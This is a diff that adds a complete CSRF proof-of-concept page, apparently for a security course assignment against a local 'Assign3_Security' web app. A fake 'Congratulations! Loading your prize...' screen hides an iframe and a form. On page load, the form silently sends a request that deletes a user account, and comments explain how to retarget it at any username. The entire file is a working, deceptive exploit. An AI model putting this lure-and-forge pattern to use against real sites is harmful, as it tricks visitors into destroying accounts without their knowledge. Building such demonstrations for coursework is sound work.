@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>You Won a Prize!</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+        }
+        .container {
+            background: white;
+            padding: 40px;
+            border-radius: 10px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+            text-align: center;
+        }
+        h1 {
+            color: #333;
+        }
+        p {
+            color: #666;
+        }
+        .spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #667eea;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Congratulations!</h1>
+        <p>Loading your prize...</p>
+        <div class="spinner"></div>
+    </div>
+
+    <!-- CSRF Attack - Hidden iframe to execute the delete request -->
+    <!-- Change the target username below to the user you want to delete -->
+    <iframe name="csrf-frame" style="display:none;"></iframe>
+
+    <form id="csrf-form"
+          action="http://localhost:8080/Assign3_Security/UserServices"
+          method="GET"
+          target="csrf-frame">
+        <!-- Change this value to the username you want to delete -->
+        <input type="hidden" name="delete" value="testuser" />
+    </form>
+
+    <script>
+        // Auto-submit the form when page loads
+        window.onload = function() {
+            document.getElementById('csrf-form').submit();
+        };
+    </script>
+</body>
+</html>
